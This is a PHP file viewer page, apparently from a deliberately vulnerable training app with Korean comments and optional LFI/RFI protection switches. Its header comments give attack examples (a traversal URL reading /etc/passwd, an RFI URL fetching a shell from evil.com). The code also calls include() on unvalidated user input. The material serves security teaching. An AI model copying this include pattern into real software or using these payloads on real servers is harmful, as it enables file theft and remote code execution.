<?php
session_start();

// LFI (Local File Inclusion) 취약점:
// 사용자가 전달한 파일 경로를 그대로 사용하여 서버의 로컬 파일을 읽을 수 있습니다.
// 공격 예시: /file_viewer.php?file=../../../../etc/passwd
//
// RFI (Remote File Inclusion) 취약점:
// php.ini 설정에서 allow_url_include=On으로 설정된 경우, 원격 서버의 악성 파일을 포함시켜 실행할 수 있습니다.
// 공격 예시: /file_viewer.php?file=http://evil.com/shell.php

$is_logged_in = isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;

// 보안 설정 확인
$lfi_protection = isset($_SESSION['security_settings']['lfi_protection']) ? $_SESSION['security_settings']['lfi_protection'] : false;
$rfi_protection = isset($_SESSION['security_settings']['rfi_protection']) ? $_SESSION['security_settings']['rfi_protection'] : false;
?>
<!DOCTYPE html>
<html>
<head>
    <title>파일 뷰어</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
            line-height: 1.6;
        }
        
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .header {
            margin-bottom: 30px;
            border-bottom: 2px solid #007cba;
            padding-bottom: 15px;
        }
        
        .header h2 {
            color: #007cba;
            margin: 0;
            font-size: 2em;
        }
        
        .file-list {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        
        .file-list h3 {
            color: #333;
            margin-top: 0;
            margin-bottom: 15px;
        }
        
        .file-list ul {
            list-style: none;
            padding: 0;
            margin: 0;
        }
        
        .file-list li {
            background: white;
            margin-bottom: 8px;
            border-radius: 5px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        
        .file-list li a {
            display: block;
            padding: 12px 15px;
            text-decoration: none;
            color: #007cba;
            font-weight: 500;
            transition: background-color 0.2s;
        }
        
        .file-list li a:hover {
            background-color: #f0f8ff;
            border-radius: 5px;
        }
        
        .file-content {
            background: white;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 20px;
            margin-top: 20px;
        }
        
        .file-content h3 {
            color: #007cba;
            margin-top: 0;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        
        .file-content img {
            max-width: 100%;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        
        .file-content pre {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            border-left: 4px solid #007cba;
            max-height: 500px;
            overflow-y: auto;
        }
        
        .nav-buttons {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
        }
        
        .btn {
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
            transition: background-color 0.2s;
        }
        
        .btn-primary {
            background-color: #007cba;
            color: white;
        }
        
        .btn-primary:hover {
            background-color: #0056b3;
        }
        
        .btn-secondary {
            background-color: #6c757d;
            color: white;
        }
        
        .btn-secondary:hover {
            background-color: #545b62;
        }
        
        .error-message {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 5px;
            border-left: 4px solid #dc3545;
        }
        
        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            border-left: 4px solid #28a745;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="nav-buttons">
            <a href="index.php" class="btn btn-secondary">🏠 메인으로</a>
            <a href="upload.php" class="btn btn-primary">📤 파일 업로드</a>
            <a href="security.php" class="btn btn-secondary">🔒 보안 설정</a>
        </div>
        
        <div class="header">
            <h2>📁 파일 뷰어</h2>
            <?php if ($is_logged_in): ?>
            <div style="text-align: right; margin-top: 10px;">
                <span style="font-size: 14px; color: #666;">LFI 보안: </span>
                <span style="font-size: 14px; font-weight: bold; color: <?php echo $lfi_protection ? '#28a745' : '#dc3545'; ?>;">
                    <?php echo $lfi_protection ? '🛡️ ON' : '⚠️ OFF'; ?>
                </span>
                <span style="margin-left: 15px; font-size: 14px; color: #666;">RFI 보안: </span>
                <span style="font-size: 14px; font-weight: bold; color: <?php echo $rfi_protection ? '#28a745' : '#dc3545'; ?>;">
                    <?php echo $rfi_protection ? '🛡️ ON' : '⚠️ OFF'; ?>
                </span>
            </div>
            <?php endif; ?>
        </div>

        <?php if (!$is_logged_in): ?>
        <div style="border: 2px solid #ffc107; background-color: #fff3cd; padding: 20px; border-radius: 8px; text-align: center;">
            <h3 style="color: #856404; margin-top: 0;">🔒 로그인이 필요합니다</h3>
            <p style="color: #856404; margin-bottom: 20px;">파일 뷰어 기능을 사용하려면 먼저 로그인해주세요.</p>
            <a href="login.php" class="btn btn-primary">로그인하기</a>
        </div>
        <?php else: ?>

        <div class="file-list">
            <h3>📂 업로드된 파일들</h3>
            <ul>
                <?php
                $upload_dir = 'uploads/';
                $files = scandir($upload_dir);
                if (count($files) <= 2) {
                    echo '<li style="background: #e9ecef; color: #6c757d; text-align: center; padding: 20px;">업로드된 파일이 없습니다.</li>';
                } else {
                    foreach ($files as $file) {
                        if ($file !== '.' && $file !== '..') {
                            echo '<li><a href="?file=' . urlencode($upload_dir . $file) . '">📄 ' . htmlspecialchars($file) . '</a></li>';
                        }
                    }
                }
                ?>
            </ul>
        </div>

<?php
if (isset($_GET['file'])) {
    $file_path = $_GET['file'];

    // RFI 대책 (보안 설정에 따라 토글)
    if ($rfi_protection && preg_match('/^(https?|ftp):\/\//i', $file_path)) {
        echo '<div class="file-content">';
        echo '<div class="error-message">🚫 보안 경고: 원격 파일 포함(RFI) 시도가 감지되어 차단되었습니다.</div>';
        echo '</div>';
    }
    // 디렉토리 트레버셜 대책 (보안 설정에 따라 토글)
    elseif ($lfi_protection && strpos($file_path, '..') !== false) {
        echo '<div class="file-content">';
        echo '<div class="error-message">🚫 보안 경고: 디렉토리 트레버셜 시도가 감지되어 차단되었습니다.</div>';
        echo '</div>';
    } else {

    $file_extension = strtolower(pathinfo($file_path, PATHINFO_EXTENSION));
    $allowed_image_extensions = ['jpg', 'jpeg', 'png', 'gif'];
    $allowed_text_extensions = ['txt', 'php', 'html', 'css', 'js', 'md'];

    echo '<div class="file-content">';
    if (in_array($file_extension, $allowed_image_extensions)) {
        echo '<h3>🖼️ 이미지 파일: ' . htmlspecialchars(basename($file_path)) . '</h3>';
        echo '<img src="' . htmlspecialchars($file_path) . '" alt="Image">';
    } elseif (in_array($file_extension, $allowed_text_extensions)) {
        echo '<h3>📄 텍스트 파일: ' . htmlspecialchars(basename($file_path)) . '</h3>';
        if (file_exists($file_path)) {
            echo '<pre>' . htmlspecialchars(file_get_contents($file_path)) . '</pre>';
        } else {
            echo '<div class="error-message">파일을 찾을 수 없습니다.</div>';
        }
    } else {
        echo '<div class="error-message">지원하지 않는 파일 형식입니다. 이미지 파일(jpg, jpeg, png, gif)과 텍스트 파일만 볼 수 있습니다.</div>';
        include($file_path);
    }
    echo '</div>';
    }
}
?>

        <?php endif; ?>
    </div>
</body>
</html>
